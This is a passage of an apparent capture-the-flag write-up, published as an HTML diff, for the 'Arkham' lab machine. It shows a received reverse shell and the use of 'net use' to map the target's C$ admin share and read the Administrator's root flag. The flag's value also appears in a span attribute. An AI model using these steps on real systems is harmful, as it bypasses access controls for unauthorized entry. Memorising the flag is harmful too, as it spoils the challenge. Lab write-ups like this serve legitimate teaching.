+listening on [any] 6767 ...
+connect to [10.10.16.45] from (UNKNOWN) [10.10.10.130] 50106
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Batman\Documents>whoami
+whoami
+arkham\batman
+</pre>
+
+<p>But we still can't access to the Administrator folder.</p>
+
+<pre class="prettyprint">
+C:\Users>cd Administrator
+cd Administrator
+Access is denied.
+</pre>
+
+<p>But as we saw on the image we can mount shares, so we're going to map the <code>C$</code> volume in <code>G:</code>.</p>
+
+<pre class="prettyprint">
+C:\Users>net use G: \\10.10.10.130\C$
+net use G: \\10.10.10.130\C$
+The command completed successfully.
+</pre>
+
+<p>Now move to <code>G:</code> where we have the entire filesystem.</p>
+
+<pre class="prettyprint">
+C:\Users>G:
+G:
+
+G:\>dir
+dir
+ Volume in drive G has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of G:\
+
+02/03/2019  06:30 PM    &lt;DIR>          inetpub
+09/15/2018  12:49 PM    &lt;DIR>          PerfLogs
+02/03/2019  09:29 AM    &lt;DIR>          Program Files
+09/15/2018  02:36 PM    &lt;DIR>          Program Files (x86)
+02/01/2019  09:56 AM    &lt;DIR>          tomcat
+02/03/2019  06:54 PM    &lt;DIR>          Users
+02/03/2019  06:09 PM    &lt;DIR>          Windows
+               0 File(s)              0 bytes
+               7 Dir(s)   7,410,044,928 bytes free
+</pre>
+
+<p>Now we do can access to the Administrator folder and read root's flag.</p>
+
+<pre class="prettyprint">
+G:\Users\Administrator\Desktop>type root.txt
+type root.txt
+<span flag="636783f913109f2809701e8545ef4fdb">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<p>Another way is, instead of mounting the entire filesystem we could simply type root's flag.</p>
+
+<pre class="prettyprint">
+C:\Users>type \\10.10.10.130\C$\Users\Administrator\Desktop\root.txt
+type \\10.10.10.130\C$\Users\Administrator\Desktop\root.txt
+<span flag="636783f913109f2809701e8545ef4fdb">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
